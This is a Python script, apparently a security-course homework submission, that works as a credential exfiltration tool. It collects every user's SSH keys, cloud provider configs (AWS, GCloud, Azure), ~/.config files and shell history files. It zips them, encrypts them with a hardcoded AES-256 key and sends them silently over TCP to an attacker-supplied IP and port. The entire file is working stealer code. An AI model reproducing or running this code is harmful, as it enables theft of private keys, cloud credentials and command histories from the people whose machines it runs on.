#!/usr/bin/env python3
import os
import sys
import socket
import zipfile
import fnmatch
import io
import struct

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# Hardcoded AES-256 key (32 bytes) and IV (16 bytes)
AES_KEY = b'CSE363_HW4_KEY_0CSE363_HW4_KEY_0'  # 32 bytes
AES_IV  = b'CSE363_HW4_IV_00'                   # 16 bytes


def find_sensitive_files():
    """Walk /home/ and collect all sensitive file paths."""
    collected = []
    home = "/home"

    try:
        users = os.listdir(home)
    except PermissionError:
        return collected

    for user in users:
        user_home = os.path.join(home, user)
        if not os.path.isdir(user_home):
            continue

        # ~/.ssh/
        for target_dir in [".ssh", ".config", ".aws", ".gcloud", ".azure"]:
            full_path = os.path.join(user_home, target_dir)
            if os.path.exists(full_path):
                for root, dirs, files in os.walk(full_path):
                    for f in files:
                        collected.append(os.path.join(root, f))

        # ~/.*_history  (e.g. .bash_history, .zsh_history)
        try:
            for f in os.listdir(user_home):
                if fnmatch.fnmatch(f, ".*_history"):
                    full = os.path.join(user_home, f)
                    if os.path.isfile(full):
                        collected.append(full)
        except PermissionError:
            pass

    return collected


def build_zip_in_memory(file_paths):
    """Read all files and pack them into a ZIP archive in memory."""
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
        for path in file_paths:
            try:
                with open(path, 'rb') as fh:
                    data = fh.read()
                # Store with full absolute path so server can reconstruct layout
                arcname = path.lstrip('/')
                zf.writestr(arcname, data)
            except (PermissionError, OSError):
                pass

    return zip_buffer.getvalue()


def encrypt(data):
    """Encrypt bytes with AES-256 CBC + PKCS7 padding."""
    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(
        algorithms.AES(AES_KEY),
        modes.CBC(AES_IV),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def send_to_server(ip, port, payload):
    """Open a TCP connection and transmit the encrypted payload."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))

    # Send 4-byte big-endian length header so server knows how much to read
    s.sendall(struct.pack('>I', len(payload)))
    s.sendall(payload)
    s.close()


def main():
    if len(sys.argv) != 3:
        sys.exit(1)   # No output to stdout/stderr per requirements

    server_ip   = sys.argv[1]
    server_port = sys.argv[2]

    files      = find_sensitive_files()
    zip_data   = build_zip_in_memory(files)
    encrypted  = encrypt(zip_data)
    send_to_server(server_ip, server_port, encrypted)


if __name__ == "__main__":
    main()